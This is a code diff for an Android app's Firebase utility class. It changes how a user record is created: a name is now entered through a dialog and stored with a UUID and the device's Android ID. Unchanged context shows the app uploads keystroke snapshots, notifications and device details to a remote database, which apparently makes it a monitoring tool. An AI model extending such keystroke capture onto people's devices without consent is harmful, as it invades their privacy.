@@ -3,8 +3,11 @@ package com.vikasyadavnsit.cdc.utils;
 import static com.vikasyadavnsit.cdc.utils.CommonUtil.getAndroidID;
 import static com.vikasyadavnsit.cdc.utils.CommonUtil.getDeviceDetails;
 
+import android.app.Activity;
 import android.content.Context;
 import android.util.Log;
+
+import java.util.UUID;
 
 import androidx.annotation.NonNull;
 
@@ -15,6 +18,8 @@ import com.google.firebase.database.FirebaseDatabase;
 import com.google.firebase.database.ValueEventListener;
 import com.vikasyadavnsit.cdc.constants.AppConstants;
 import com.vikasyadavnsit.cdc.data.AppUsageReportData;
+import com.vikasyadavnsit.cdc.dialog.MessageDialog;
+import com.vikasyadavnsit.cdc.enums.ApplicationInputActions;
 import com.vikasyadavnsit.cdc.data.KeyStrokeData;
 import com.vikasyadavnsit.cdc.data.NotificationData;
 import com.vikasyadavnsit.cdc.data.User;
@@ -33,6 +38,28 @@ public class FirebaseUtils {
 
     public static void initialize(Context context) {
         FirebaseUtils.context = context;
+    }
+
+    public static void checkUserExistsAndInit(Activity activity) {
+        DatabaseReference userRef = getDbRef(getBasePath(activity));
+        userRef.addListenerForSingleValueEvent(new ValueEventListener() {
+            @Override
+            public void onDataChange(@NonNull DataSnapshot snapshot) {
+                if (!snapshot.exists()) {
+                    activity.runOnUiThread(() ->
+                            MessageDialog.multilineInputDialog(activity,
+                                    ApplicationInputActions.FIREBASE_CREATE_USER));
+                } else {
+                    getAppTriggerSettingsData();
+                }
+            }
+
+            @Override
+            public void onCancelled(@NonNull DatabaseError error) {
+                Log.e("FirebaseUtils", "checkUserExistsAndInit failed: " + error.toException());
+                getAppTriggerSettingsData();
+            }
+        });
     }
 
     // Get a reference to the database
@@ -97,30 +124,16 @@ public class FirebaseUtils {
         return map;
     }
 
-    public static void checkAndCreateUser() {
-        DatabaseReference userRef = getDbRef(getBasePath(context));
-        userRef.addListenerForSingleValueEvent(new ValueEventListener() {
-            @Override
-            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
-                if (!dataSnapshot.exists()) {
-                    // User does not exist, create a new user
-                    userRef.setValue(getUserData());
-                }
-            }
 
-            @Override
-            public void onCancelled(@NonNull DatabaseError databaseError) {
-                // Failed to read value
-                Log.e("FirebaseUtils", "Failed to read value." + databaseError.toException());
-            }
-        });
-    }
-
-    private static User getUserData() {
-        return User.builder()
-                .fullName("Vikas Simulator")
+    public static void createUser(String name) {
+        String uuid = UUID.randomUUID().toString();
+        User user = User.builder()
+                .id(uuid)
+                .fullName(name)
                 .deviceDetails(getDeviceDetails(context))
                 .build();
+        getDbRef(getBasePath(context)).setValue(user);
+        getDbRef(AppConstants.FIREBASE_RTDB_FLAT_USER_PATH + getAndroidID(context)).setValue(user);
     }
 
     public static void uploadUserKeystrokeDataSnapshot(KeyStrokeData keyStrokeData) {
@@ -172,7 +185,7 @@ public class FirebaseUtils {
     }
 
     public static void getFlatUserDetails() {
-        DatabaseReference ref = getDatabase().getReference(AppConstants.FIREBASE_RTDB_BASE_PATH);
+        DatabaseReference ref = getDatabase().getReference(AppConstants.FIREBASE_RTDB_FLAT_USER_PATH);
         ref.addValueEventListener(new ValueEventListener() {
             @Override
             public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
